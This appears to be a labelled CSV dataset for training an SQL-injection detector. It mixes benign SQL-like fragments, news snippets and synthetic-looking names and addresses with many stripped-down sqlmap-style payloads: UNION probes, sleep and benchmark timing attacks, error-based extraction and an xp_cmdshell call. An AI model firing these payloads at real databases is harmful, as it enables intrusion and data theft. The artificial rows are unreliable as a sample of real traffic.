Query,Label
eldredge,0.0
select importance carried inner join,0.0
%,1.0
"& quot ; bernard squarcini , former head french internal intelligence agency dcri , quoted interview month saying : & quot ; service know perfectly well country , even co-operate antiterrorist fight , spy ally",0.0
"make_set = 9734,1",1.0
['= * pdia ilke pdia'],1.0
"select create , bottom pretty familiar = play union select tower , opinion go",0.0
"update bent set compare = arrive , city = provide chart = spin",0.0
,0.0
course day one thing became particularly clear : scepticism towards new system reluctantly yet visibly giving way confidence,0.0
select * sink steel =,0.0
rlike select case = else 0x28 end,1.0
soguillo,0.0
select period thought select even busy,0.0
select top * enter select * social 3select * water,0.0
,0.0
"% select * select * select concat 0x7171706a71 , select elt = 3484,1 ,0x717a767a71,0x78 , , % =",1.0
"xebl = = select count * generate_series 1,5000000 --",1.0
select count whose several,0.0
"['% = select count * sysibmsystables t1 , sysibmsystables tD2 , sysibmsystables t3 % =']",1.0
select * primitive equal = arrange,0.0
desmedro,0.0
select * plane band = gold fetch first row,0.0
"['-496e union select 4750,4750,4750,4750,4750 --']",1.0
"pydh = = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 --",1.0
61603039t,0.0
select * whatever health managed,0.0
"kim woodland , huang zweig , christensen et al",0.0
"union select null , null , null , null , null , null , null #",1.0
pasote,0.0
"brent crude , benchmark international crude also used u",0.0
"exp ~ select * select concat 0x7171706a71 , select elt = 6270,1 ,0x717a767a71,0x78 x tiet like tiet",1.0
['cKal ='],1.0
% =,1.0
select * harbor fetch first percent row,0.0
['-6746 = --'],1.0
gaudet,0.0
['-5c32 % ='],1.0
"iif = 4954,1,1/0",1.0
464e+15,0.0
select * select sleep fzno svwr = svwr,1.0
-9501 = select upper xmltype chr ||chr ||chr ||chr ||chr ||chr ||chr || select case = else end,1.0
['mic ='],1.0
select book religious union,0.0
"1|| select ttyt = = select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 --",1.0
"-3461 union select 6342,6342,6342,6342,6342,6342 #",1.0
"['char ||cha ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , null --']",1.0
dueas cristaldo,0.0
"['% = select count * all_users tk1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --']",1.0
"['= = select coaunt * domaindomains t1 , domaincolumns t2 , domaintables t3 --']",1.0
['-7914 = * -- eepn'],1.0
['select case = else * seletc mastersysdatabases end --'],1.0
"procedure analyse extractvalue , concat 0x5c,0x7171706a71 , select case = else end ,0x717a767a71 ,1 ctac like ctac",1.0
-5062 = * hsge = hsge,1.0
select several,0.0
yzzk = = * --,1.0
"= = select count * domaindomains t1 , domaincolumns t2 , domaintables t3 --",1.0
ibero,0.0
fuchskeres @ cpanelwebtel,0.0
"1+ select jidy = procedure analyse extractvalue , concat 0x5c , benchmark , md5 0x4b774c75 ,1 #",1.0
,0.0
['select case = else * select mastersysdatabases enz --'],1.0
"= select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7",1.0
delfina,0.0
73spojador,0.0
-5356 = #,1.0
escudero ostria,0.0
"['% elEt = , sleep #']",1.0
"glorieta antonio molina ,",0.0
7o14c0o,0.0
order --,1.0
"according information regional church , cover three quarter lower saxony , around pastor retire every year",0.0
select case = else cast int / select dual end dual --,1.0
al769i4,0.0
pijahumeda,0.0
"['% = select count * generate_series 1,500000 --']",1.0
-9673 = --,1.0
"['% elt = , lseep % =']",1.0
rutilant+e,0.0
browne,0.0
-4289 char +char +char +char +char + select case = char else char end +char +char +char +char +char agnc like agnc,1.0
"potk = elt = , sleep #",1.0
685e+15,0.0
tiberio,0.0
"= select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3",1.0
estaol bellet,0.0
-3297 = dbms_utilitysqlid_to_sqlhash chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr,1.0
"elt = , sleep mbxh like mbxh",1.0
select * salmon first wool well,0.0
polo @ familiamarinobn,0.0
"patent cover technology help match internet search term relevant advertising , lawsuit said , core google & apos ; search business",0.0
"select column_name citizen , action",0.0
maestre camprubi,0.0
arnone,0.0
select * compound little = fetch first row,0.0
1+ select tmel = rlike select case = else 0x28 end +,1.0
select drove,0.0
"-6041 make_set = 1367,1367 hxjf = hxjf",1.0
oury_boskovic8 @ faderscomtv,0.0
"elt = 4249,7259 =",1.0
['= select els drop function nsoq --'],1.0
select valuable sport,0.0
jorba bastardes,0.0
"['= dbms_pipereceive_message chr ||hcr ||chr ||chr ,5 diiv = diiv']",1.0
55z8do,0.0
"-4947 boolean mode union select 3314,3314 #",1.0
"= select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5",1.0
"union select null , null , null , null , null , null , null , null , null --",1.0
"char ||char ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , null # tcrm",1.0
-3634 % =,1.0
jared,0.0
-2568 = * exyw = exyw,1.0
; exec masterxp_cmdshell ping --,1.0
sagaceta farell,0.0
"1+ select nzgq = elt = , sleep +",1.0
"= select count * domaindomains t1 , domaincolumns t2 , domaintables t3 --",1.0
fo9nece9,0.0
select distinct swimming happily,0.0
"-5424 union select 8231,8231,8231,8231,8231,8231,8231,8231 #",1.0
"= elt = 4249,7259 --",1.0
"['call regexp_substring repeat right char ,0 ,500000000 , null frpo like frop']",1.0
jvvs =,1.0
"% select * select * select concat 0x7171706a71 , select elt = 3484,1 ,0x717a767a71,0x78 , , % =",1.0
"-2333 union select 9714,9714,9714 --",1.0
arena de san juan,0.0
"= union select null , null , null #",1.0
"pl san anton ,",0.0
goubanov @ delujosbg,0.0
aghili,0.0
,0.0
monforte del cid,0.0
"['yphz = union select nlul , null , null , null , null , null , null --']",1.0
% rlike select case = else 0x28 end % =,1.0
delmo,0.0
"= updatexml , concat 0x2e,0x7171706a71 , select elt = 1808,1 ,0x717a767a71 ,8666 --",1.0
select case = else * select mysqldb end #,1.0
select avg duck box select sum triangle,0.0
"= procedure analyse extractvalue , concat 0x5c , benchmark , md5 0x4b774c75 ,1 #",1.0
['= rlikPe select * select sleep sgvo --'],1.0
482e+15,0.0
,0.0
oate fijo,0.0
hac228ej7,0.0
"-4571 union select 3227,3227,3227,3227 --",1.0
"union select null , null #",1.0
torres de la alameda,0.0
daphne,0.0
enfermamente,0.0
"-4223 union select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913 #",1.0
"select , control+ , + slabs+ + upward+ , + chosen name everything",0.0
,0.0
['aaitfor delay 0:0:5 yauq = yauq'],1.0
yamasaki @ multaspendienteseg,0.0
serapia,0.0
"granados ,",0.0
"= select * select * select concat 0x7171706a71 , select elt = 3484,1 ,0x717a767a71,0x78 , , --",1.0
"select even , winter , various , team , two needle join wet examplecarry = wouldworker inner join nearbyon ordersfeel = claymagicid",0.0
"-7041 union select 2159,2159,2159,2159,2159 --",1.0
76150645z,0.0
['-7E03 = ='],1.0
['-9891 union selcet #'],1.0
,0.0
-6971 = dbms_utilitysqlid_to_sqlhash chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr ifuh like ifuh,1.0
dr,0.0
fire crew called rescue lost puppy got stuck 50ft ground precarious ledge quarry cocker spaniel ruby run minor road crash spotted three day later dog walker trapped quarry firefighter abseil cliff face pluck dog certain death puppy lucky escape fire crew called lift safety somehow got stuck 50ft precarious cliff ledge,0.0
"['elt = 429,7259']",1.0
"oiqr = = select count * generate_series 1,5000000 --",1.0
"= union select null , null , null , null , null , null --",1.0
delete pole making =,0.0
liester-okamoto @ carloshoyanp,0.0
"addition , container material regularly sent africa , example march year medical device , medicine , bandaging material , hospital bed spectacle sent",0.0
magriny,0.0
quiles,0.0
"select column1 , column2 , column3 , newtable externaldb oldtable condition ;",0.0
"['-3368 union select 4913,4913,4913,4913,491O3,4913,4913,4913,4913 --']",1.0
select * customer customername like % ;,0.0
18914400m,0.0
"['= select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables yt3 tkcy like tkcy']",1.0
,0.0
"select column_name , giant",0.0
; waitfor delay 0:0 : __time__ --,1.0
"= = like abcdefg , upper hex randomblob 500000000/2 --",1.0
"xsyk = = select count * generate_series 1,5000000 --",1.0
select * user id = ; @ = --,1.0
select * select fresh left,0.0
"% = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 % =",1.0
speaker johanna rahner,0.0
hawi,0.0
"select warn , reach+ , + firm+ + powerful+ , + friendly ago attack",0.0
select * stopped safe = setting fetch first row,0.0
select * border mighty = shallow,0.0
"wxms = = select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 --",1.0
= select upper xmltype chr ||chr ||chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr ||chr dual ajka = ajka,1.0
,0.0
"mesonero romanos , s/n , 2b",0.0
allegra,0.0
lareo roble,0.0
select count distinct experience talk,0.0
degeistirk @ meneamexpr,0.0
kamber @ weatgd,0.0
62776679l,0.0
escalera,0.0
"avinguda francesc macia , 3b",0.0
"= select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 ccuy = ccuy",1.0
select * double apartment = invented,0.0
"['-3775 rqet = elt = 1032,3o23 --']",1.0
select count education memory,0.0
"select truncate , ;",0.0
['awNg ='],1.0
frontado victory,0.0
select * brain meal = beat fetch first row,0.0
avinguda de la reina maria cristina 2b,0.0
463e+14,0.0
,0.0
"-6453 hehs = union select 9363,9363,9363,9363,9363,9363,9363,9363,9363 #",1.0
"select * user id = < @ union select , version --",1.0
28782294w,0.0
"= like abcdefg , upper hex randomblob 500000000/2 cogf like cogf",1.0
"un hail new goal tackle poverty united nation start work immediately new set goal replace millennium development goal , put place year ago tackle global poverty",0.0
select * yellow = bend,0.0
select * mouse wrong = offer fetch first row,0.0
"camio monte , 10h",0.0
"% = select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --",1.0
['select case = else cast int / select dual end udal'],1.0
= dbms_utilitysqlid_to_sqlhash chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr gozk = gozk,1.0
"['-8929 % union select 9486,9486,9486,948y6 #']",1.0
cinw = = select pg_sleep --,1.0
,0.0
-8553+ select adko = union select #,1.0
"update alike set think = gather , city = oil expect = sit",0.0
select music garden left join,0.0
"['= bnechmark , md5 0x544d5a4c #']",1.0
-3377 = #,1.0
villoresi @ n340magazintc,0.0
"select local , needed , ratherfrom law doctor null",0.0
"-8612+ select iqla = union select 5035,5035,5035,5035,5035,5035,5035 #",1.0
-6746 = * kohi like kohi,1.0
"union select null , null , null #",1.0
nonconformity world whip displeasure,0.0
"% = select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 % =",1.0
"% = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 --",1.0
"george kerevan : europe break-up give scot choice another day , another independence scare story",0.0
"['= select Jcount * generate_series 1,5000000 -- xgyc']",1.0
"['select * user id = < @ union select , Tversion --']",1.0
blan2ueo,0.0
"= select count * generate_series 1,5000000 --",1.0
came home school scared upset first among friend,0.0
"ibqr = = dbms_pipereceive_message chr ||chr ||chr ||chr ,5 --",1.0
"= = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 --",1.0
% rlike select * select sleep vwyq #,1.0
bonil schettino,0.0
"select * glass order rabbit asc , lay desc",0.0
"select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 =",1.0
nicolle,0.0
"= select count * generate_series 1,5000000 -- xgyc",1.0
select avg price fair,0.0
select count distinct third passage,0.0
"select case = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null else char ||char ||char ||char end value",1.0
select avg though making select sum cowboy,0.0
"resident home fire , continued police spokesperson",0.0
film never slip prurience sensationalism - & apos ; problem,0.0
piero,0.0
"exp ~ select * select concat 0x7171706a71 , select elt = 6270,1 ,0x717a767a71,0x78 x luoj = luoj",1.0
c/ asuncion 5e,0.0
"drrx = union select null , null , null --",1.0
pblica,0.0
['-7387 oredr --'],1.0
-9005 union select #,1.0
million,0.0
"-2745 elt = 1032,3623 vfxq = vfxq",1.0
"['% union select null , null , null , null , null , nulX , null --']",1.0
['-6469 = #'],1.0
onofredo,0.0
ca1t01i4oso,0.0
"['fkco = select select count * , concat 0x7171706a71 , select elt = 9173,1 ,0x717a767R71 , floor rand * x information_schemacharacter_sets group x --']",1.0
select * mark pony = led limit,0.0
"calle guiol , 10c",0.0
maijhara,0.0
% = #,1.0
ericsson,0.0
shalom,0.0
"= benchmark , md5 0x76555642 -- kvkk",1.0
select * value = hard limit,0.0
mao,0.0
"select dbms_pipereceive_message chr ||chr ||chr ||chr ,5 dual #",1.0
tarragona,0.0
"insert respect say , officer , value ruler , party , gradually",0.0
"['call regexp_substrin repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null --']",1.0
"1|| select xasp dual = exp ~ select * select concat 0x7171706a71 , select elt = 8190,1 ,0x717a767a71,0x78 x ||",1.0
westermeier,0.0
"select * gun slave army , line , ground",0.0
soldani-godet @ informexru,0.0
['-6014 = * qZtge = qtge'],1.0
"union select null , null , null , null , null , null , null , null , null , null #",1.0
"['= select count * rdb $ fieCd t1 , rdb $ type t2 , rdb $ collation t3 , rdb $ function t4 khah like khah']",1.0
['wssxb ='],1.0
"['boolean mode char ||char ||char ||char = regexp_substring repaet left crypt_key char ||char ||char , null ,0 ,500000000 , null #']",1.0
select min stared substance easier,0.0
select distinct ran outline,0.0
"['= select case = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null lse char ||char ||char ||char edn value --']",1.0
select * select funny tiny,0.0
rlike select * select sleep sgvo =,1.0
"-1891 boolean mode union select 6680,6680,6680,6680,6680,6680,6680,6680 #",1.0
"['-5891 union select 103,7103,7103,7103 --']",1.0
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec @ q,1.0
select power correctly,0.0
demorest,0.0
"% = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 % =",1.0
admin/ *,1.0
"iif = 8866,1,1/0",1.0
"= char ||char ||char ||char = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null --",1.0
"keom = = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 --",1.0
"['= select count * sysusers sys1 , sysugers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7']",1.0
two top-class junior cyclist also starting line-up competition : felix bader bad waldsee pascal treubel aach-linz came recommendation achieved good position german championship,0.0
zens-trebaol6 @ gesautonomosrw,0.0
"[', iif = 6S625,1,1/0']",1.0
"['nion select null , null , null , null , null , null , null , null --']",1.0
ag2u7a,0.0
"['= like abAcdefg , upper hex randomblob 500000000/2']",1.0
lippman,0.0
select * user id = # ; = --,1.0
com style = max-width:450px ; float : left ; padding:10px 10px 10px 0px ; border:0px ; > type buying selling turn buy omnicef diner club store > buy omnicef diner club store < /a > 544473buy omnicef diner club store/url 9aratgxun99s5bw1e @ v $ k @ jrljltnn1afzqew2ch @ v $ k @ 1d2rrer7vmuzdd4npcz @ v $ k @ /ckclyeqatppzvnr < /methodcall > < /methodcall > < /params > < xml version =,0.0
pfitzmann_bray @ cirugiaparpadoan,0.0
"-5911 union select 2245,2245,2245,2245,2245,2245 #",1.0
select * swept fetch first row select top percent * pond,0.0
"calle muelles , 10d",0.0
665e+15,0.0
"select saddle closer , promised mind fireplace",0.0
"-4807 = ctxsysdrithsxsn , chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr wwki = wwki",1.0
select min partly usually combination,0.0
alfio,0.0
"union select null , null , null --",1.0
select * slow fetch first percent row,0.0
"= exp ~ select * select concat 0x7171706a71 , select elt = 8190,1 ,0x717a767a71,0x78 x --",1.0
"union select null , null , null , null , null , null , null #",1.0
['select * selct sleep fzno ='],1.0
select count * month,0.0
select top * reach mood = crop,0.0
"-5097 union select 8992,8992,8992,8992,8992,8992,8992,8992,8992 --",1.0
"banker tried play affair saying vast highly liquid foreign exchange market almost impossible manipulate , senior trader saying necessarily true",0.0
1|| select yezk =,1.0
update would set = wrappedwhere family = film,0.0
remedo,0.0
"select column_name without , saved",0.0
came idea reading research paper jellyfish convinced scientist china chemically recreate glowing protein,0.0
=,1.0
"1|| select ativ dual = union select null , null , null , null #",1.0
"elt = , sleep ayjb like ayjb",1.0
"['exp ~ select * select concat 0x7171706a71 , select elt = 6270,1 ,0x717a767a71,07x8 x lgcw = lgcw']",1.0
['select * urer id = @ # { = = --'],1.0
616e+15,0.0
argelita,0.0
incident took place terminal,0.0
= = cast chr ||chr ||chr ||chr ||chr || select case = else end : :text|| chr ||chr ||chr ||chr ||chr numeric --,1.0
"= union select null , null , null , null , null , null , null , null , null , null --",1.0
53238791r,0.0
a2b66r5z,0.0
kristel,0.0
select earn good,0.0
viseu 8c,0.0
nolen @ enmenorcacomth,0.0
select * order previous,0.0
"= ctxsysdrithsxsn , chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr gxhz = gxhz",1.0
"select count * rdb $ field t1 , rdb $ type t2 , rdb $ collation t3 , rdb $ function t4 # ljph",1.0
% = % =,1.0
,0.0
-1252 = dbms_utilitysqlid_to_sqlhash chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr,1.0
"['-6587 union select 6349,n349,6349,6349,6349,6349,6349,6349,6349,6349 --']",1.0
urgeles montanuy,0.0
"rnfb = = benchmark , md5 0x544d5a4c #",1.0
01633578a,0.0
"= union select null , null , null , null , null , null , null , null , null , null #",1.0
mcdonald,0.0
select * select sleep srmq % =,1.0
,0.0
official found strange continued investigate,0.0
34965589t,0.0
cr4ito,0.0
"['select case = regexp_substring repeat left crypt_key char ||chra ||char , null ,0 ,500000000 , null else char ||char ||char ||char end value ffcf like ffcy']",1.0
select min tale equally program,0.0
19782471x,0.0
select * hospital series = stay,0.0
,0.0
,0.0
"['% = select count * generate_series 1,500000 % =']",1.0
1|| select aojt dual =,1.0
select * metal carry discovery national,0.0
-3359 order --,1.0
"['-3697 union selech 5180,5180,5180,5180,5180,5180,5180 --']",1.0
"c/ pintores zubiaurre , ,",0.0
select * basket joy like blow %,0.0
pammie,0.0
select * native fetch first percent row,0.0
"= = select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 --",1.0
"['% = dbms_pipereceive_message chr ||chr ||crh ||chr ,5 % =']",1.0
"['1|| select hrpa = union seletc null , null , null , null , null , null , null , null , null --']",1.0
-5161 % = * % =,1.0
"wrong people continually throw fast food bag car window weekend particular , discarded paper bag found side road car park",0.0
renny,0.0
"select trace scientist , bus rod bush",0.0
raixa s/n,0.0
['-2348 sige = = cast cr ||chr ||chr ||chr ||chr || select case = else end : :text|| chr ||chr ||chr ||chr ||chr numeric --'],1.0
,0.0
"select * research till production , winter , burst",0.0
select case = else null end --,1.0
select eaten captured,0.0
"['% union select nll , null , null , null , null --']",1.0
sappington-espana @ fighting-machinesmq,0.0
sleep taaj = taaj,1.0
1+ select iyyv = select * select sleep ydpu +,1.0
holoubek @ hojainformativasua,0.0
75n63d25,0.0
"= = select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --",1.0
select string possible select knew,0.0
"select case = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null else char ||char ||char ||char end value usht like usht",1.0
"['-6249 union select 5136,Y136,5136,5136,5136,5136,5136,5136,5136 --']",1.0
culham,0.0
"-4860 azyx = union select 6901,6901,6901,6901,6901 #",1.0
"= = select count * generate_series 1,5000000 --",1.0
select cell forest left join,0.0
demarco_phuong @ beesmerme,0.0
"['% = select cosunt * domaindomains t1 , domaincolumns t2 , domaintables t3 % =']",1.0
"select * current order planned , behavior",0.0
calle parque del huecar 6a,0.0
"['= dbms_pipereceive_message chr ||hr ||chr ||chr ,5 --']",1.0
vistabella,0.0
= qqpjq|| select case else end rdb $ database ||qzvzq,1.0
,0.0
"procedure analyse extractvalue , concat 0x5c,0x7171706a71 , select case = else end ,0x717a767a71 ,1 # mafe",1.0
select * need dangerous like occasionally %,0.0
pravia,0.0
select count afraidid paragraph,0.0
e6tal1g68,0.0
wesselhoft,0.0
select river laugh select combine increase,0.0
-4607|| select wkdg = order --,1.0
select * user id = < @ < @ = --,1.0
select count earlier experience,0.0
& quot ; attempted look specie,0.0
||6,1.0
"= benchmark , md5 0x694a4745 raru = raru",1.0
select * must protection = test bee = arrive,0.0
"-5292 union select 1439,1439,1439,1439 #",1.0
"['-3628 = convert int , select char +hcar +char +char +char + select case = char else char end +char']",1.0
,0.0
select * lose hour = distance,0.0
rub de bracamonte,0.0
"-2007 % union select 7298,7298,7298 #",1.0
"updatexml , concat 0x2e,0x7171706a71 , select elt = 3393,1 ,0x717a767a71 ,1161 nkgd = nkgd",1.0
crichton,0.0
select top percent * phrase select * loud fetch first percent row onlyselect top * able,0.0
"['1|| select rfrk dual = extractvalue , concat 0x5c,0x7171706a71 , select elt = 7982,1 ,0x717a767a71 ||']",1.0
"select count * rdb $ field t1 , rdb $ type t2 , rdb $ collation t3 , rdb $ function t4 qfls = qfls",1.0
select avg exact bee select sum battle,0.0
"['select * ujer id = # $ union select , version --']",1.0
"-2312 union select 5282,5282,5282,5282,5282,5282,5282,5282 --",1.0
su7r5orato,0.0
['='],1.0
,0.0
['-80C7 ='],1.0
"select count negative , attack night lonely",0.0
inescourt7 @ citycvsmil,0.0
,0.0
"pfwt = union select null , null , null , null , null , null , null , null , null #",1.0
e11c5nt6o,0.0
champ,0.0
"-9606 = ctxsysdrithsxsn , chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr # iuij",1.0
nader,0.0
delete captain clothing =,0.0
"['-2230 % union Pselect 3303,3303,3303 --']",1.0
select avg mud learn select sum,0.0
"['elt = , sleep tmbs = jmbs']",1.0
"select flew , instead , vapor independent left join order earnthoughid = platebuilt order rockysurface",0.0
"['-9122 sdlg = union selet 1546,1546,1546,1546,1546,1546,1546 --']",1.0
ostapovich furnari,0.0
select useful warn,0.0
,0.0
"select * swept thirty sang , almost , take",0.0
"insert master egg , exclaimed , fully value eaten , quiet , combine",0.0
-1184 union select --,1.0
bojanic-gidra-tolan @ elcarritodelacomprama,0.0
select * studied route like chose %,0.0
"saturday october , exceptional mass heard",0.0
"select * user id = union select 1a , banner v $ version rownum = --",1.0
14554532v,0.0
select * fat lower = hang drew = purple,0.0
"calle santa teresa , 5b",0.0
select * user id = % = --,1.0
['1+ wselect gblp ='],1.0
-4363 % = qqpjq|| select case else end rdb $ database ||qzvzq % =,1.0
"['make_set = 4703,A703 # zbrf']",1.0
"select * solid order captured , nest",0.0
select avg greatest doctor select sum route,0.0
"% = convert int , select char +char +char +char +char + select case = char else char end +char +char +char +char +char % =",1.0
"['-1891 boolean mode union select 6680,680,6680,6680,6680,6680,6680,6680 #']",1.0
select wp_posts * wp_posts id,0.0
"% = select count * generate_series 1,5000000 --",1.0
select weekday 2017-06-15 ;,0.0
-2783 % = select upper xmltype chr ||chr ||chr ||chr ||chr ||chr ||chr || select case = else,1.0
dariela,0.0
seblcor,0.0
1|| select aioq dual =,1.0
"['elt = 42H49,7259 =']",1.0
select * side speech = hole limit,0.0
"woka = = select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --",1.0
select * paint century change selection,0.0
mcarthur,0.0
"['% union select null , null , null , null , null , null , nll , null #']",1.0
% rlike select * select sleep vwyq #,1.0
znak =,1.0
declare @ varchar select @ = 0x77616974666f722064656c61792027303a303a31302700 exec @,1.0
update collect set couple = battlewhere bigger = earth,0.0
"% char ||char ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , null --",1.0
"% char ||char ||char ||char = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null --",1.0
select count clean influence,0.0
select @ @ version --,1.0
% = select pg_sleep --,1.0
956e+15,0.0
"['select like abcdefg , uppre hex randomblob 500000000/2 % =']",1.0
select * equal letter everything sound,0.0
"make_set = 8403,8899 niux = niux",1.0
"['1|| select qued = prlcedure analyse extractvalue , concat 0x5c , benchmark , md5 0x4b774c75 ,1 #']",1.0
tnux = rlike select * select sleep vwyq #,1.0
select avg letter dull select sum service,0.0
['% ='],1.0
"-3747 union select 8962,8962,8962,8962,8962 #",1.0
loudiadi,0.0
-9031 % order --,1.0
select * handsome five = anyway fetch first row,0.0
"['-5507 elt = 1032,3623 ndqw = undqw']",1.0
select * mean gentle thy green,0.0
"drew bowler , managing director bowler motorsport , said : & quot ; rally customer coming bowler changed",0.0
select case = else 1/ select end --,1.0
"['select * user di = @ ` \\ ` union select , version --']",1.0
"['-4327 make_set = 1781,1781 rlclf like lclf']",1.0
"% = benchmark , md5 0x694a4745 % =",1.0
kirov @ ofertachinafm,0.0
"select post_id , meta_key , meta_value wp_postmeta post_id order meta_id asc",0.0
"['-8144 = elt = 7186,7816 --']",1.0
trung,0.0
"select post_id , meta_key , meta_value wp_postmeta post_id 28313,28341 order meta_id asc",0.0
"procedure analyse extractvalue , concat 0x5c,0x7171706a71 , select case = else end ,0x717a767a71 ,1",1.0
['wnnp ='],1.0
"general bravo , ,",0.0
zovk = = select pg_sleep --,1.0
"= benchmark , md5 0x694a4745 =",1.0
,0.0
cerinza,0.0
"= union select null , null , null , null , null , null , null #",1.0
['-794P1 = * -- eepn'],1.0
select * let order wave,0.0
"['-9057 group concat 0x7171706a71 , select case = else end ,0x717a767a71 , floor rand * nmin #']",1.0
['-3088 = mwik = miwk'],1.0
trastabilln,0.0
['boolean mode oredr #'],1.0
select plate ability union select canal sum order slip,0.0
select distinct hang sudden,0.0
"% = select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 % =",1.0
"1|| select ojdz = = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 ||",1.0
-3609 fzyp = = #,1.0
"['% char ||char ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , nul % =']",1.0
"select * user id = * union select , banner v $ version rownum = --",1.0
"select concat 0x7171706a71 , select elt = 7381,1 ,0x717a767a71",1.0
"['char ||cha ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , null --']",1.0
select * struggle tea = forest,0.0
5he1un,0.0
761e+15,0.0
select * price,0.0
select * select brick sure,0.0
select * create heading = send,0.0
"select * user id = = union select , banner v $ version rownum = --",1.0
% =,1.0
"wokl = union select null , null , null , null , null , null --",1.0
['% = * % ='],1.0
select top percent * custom,0.0
"% = like abcdefg , upper hex randomblob 500000000/2 --",1.0
"cubo de tierra del vino , el",0.0
['%'],1.0
['-1252 = dbms_utilitysqlid_to_sqlhash hcr ||chr ||chr ||chr ||chr || select case = else end dual ||chr'],1.0
select * feed decide = promised fetch first row,0.0
d012965226m6ent0,0.0
select * chose shut unknown leaf,0.0
standard automatic speech recognizers output unstructured stream word,0.0
"select dbms_pipereceive_message chr ||chr ||chr ||chr ,5 dual # gnga",1.0
dundas @ informatica2009jo,0.0
598e+15,0.0
"% = select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --",1.0
brigitte,0.0
['prit'],1.0
end =,1.0
"= select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 lano = lano",1.0
sentiment instil value thought may contain,0.0
"tres villa , la",0.0
